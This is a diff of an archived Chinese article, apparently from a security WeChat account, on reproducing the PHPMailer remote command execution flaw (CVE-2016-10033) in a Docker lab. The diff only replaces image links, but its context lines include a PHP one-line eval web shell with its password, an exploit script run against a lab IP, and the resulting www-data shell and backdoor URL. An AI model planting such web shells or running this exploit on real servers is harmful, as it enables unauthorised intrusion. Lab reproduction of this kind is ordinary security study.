@@ -41,7 +41,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iYUGj-iOOv6oHdex36L4GA)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlMU7s4ds5JHkq2jcVRvsSykcauDh23SDngsKpvO3nbWyW5HFe5VWDWA/640?wx_fmt=png)
+![](../../.resource/remote/34ac6959becd9af28548a03b6fc6080f45e290bd9c9801326cc9f8c37b81125a.png)
 
 PHPMailer 远程命令执行漏洞复现
 
@@ -65,7 +65,7 @@ docker run --rm -it -p 8080:80 vulnerables/cve-2016-10033
 
 拉去镜像启动环境：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlxoXNRlsZ9tLymuiaY2pfXFjCnQiakRnqLJpA1ArEQd8pJ3X3oDcuBjww/640?wx_fmt=png)
+![](../../.resource/remote/a0edf3d5e1c8900df9972f7b9a2519808be2f3f8e0dca4551eb3c055fcf5f132.png)
 
 http://192.168.1.107:8080/
 
@@ -79,25 +79,25 @@ http://192.168.1.107:8080/
 <?php @eval($_POST['thelostworld']); ?> 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlNdXU5ZdmARDf3YdMwDfryK6ibibVal7ibO2c6EzWAFbbiay9P8XF242jSw/640?wx_fmt=png)
+![](../../.resource/remote/ba2307cff46b83362027c0881d26d7884f3c15aae9e8742738da3a76b9f33865.png)
 
 上传完一句话木马后，页面会响应 3-5 分钟，响应时间较长
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlQzNqeHZKib4Jia2Geiaic4CSCSkb0NJw1CMibtUwVZjrqaqQVn2DtMkiaxTA/640?wx_fmt=png)
+![](../../.resource/remote/bb41f20894cc1e90910405d2a23c63855cc47fab9bdfdea866fc51df9e752db1.png)
 
 木马地址：http://192.168.1.107:8080/a.php 密码：thelostworld
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlL4mp3kudzvwXdvC0bNvA7hibpmRfkrWhDLEdqZQVX5Y8SOkYOUcO3SA/640?wx_fmt=png)
+![](../../.resource/remote/631de6455af87ae07cbca82741c84d708834a48bef8e600cfa9cd780a674066c.png)
 
  虚拟终端：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1Yhnxdlrc7gRmfZibjaA1cicczYUaTHsUN5icwJ2iaT5Z9afAaB8ibvxR6Rn8qo6wQ/640?wx_fmt=png)
+![](../../.resource/remote/5f26f54e1216575f4a7bc67825d348d4128b90c8ab4bce7cf3c444d7d9f8e887.png)
 
 使用脚本：
 
 获取脚本后台回复 “PHPMailer” 获取脚本  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlWaPZG2xdjmFpPibVDfYGGNYUOvycF3mvJ1lAh6YOsS2gr7zNTfSH0ew/640?wx_fmt=png)
+![](../../.resource/remote/376911bc9539518cc86761ed3d5bdc126463445de0802a0cf106aba155455551.png)
 
 ```
 ➜  Desktop ./exploit.sh 192.168.1.107:8080
@@ -122,7 +122,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 http://192.168.1.107:8080/backdoor.php
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlZ3D1JEialeLzlBeMVzS2JUMVWV4cgCYcH1PibydYaMg3EDFqehia13WicQ/640?wx_fmt=png)
+![](../../.resource/remote/235e1c141c3209b428fcde66965d11ea3c624a8540c7d1459fcae4b81a43cedf.png)
 
 参考：
 
@@ -140,7 +140,7 @@ thelostworld
 
 安全路上，与你并肩前行！！！！
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)
+![](../../.resource/remote/7a6d2f13ca361326dd71145e64ce4b16b853688149568ad8f7594066b738e9c1.jpg)
 
 个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns
 
@@ -152,11 +152,11 @@ thelostworld
 
 FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)
+![](../../.resource/remote/64b19fa585837043e1eae7cea904e1b86a2db6ccb2fdde1d09513641413365d6.png)
 
 欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)
+![](../../.resource/remote/9255e3712e3885c431d5087872642f32c2e71629b39b93e381a5a147814af2d4.png)
 
 ---
 
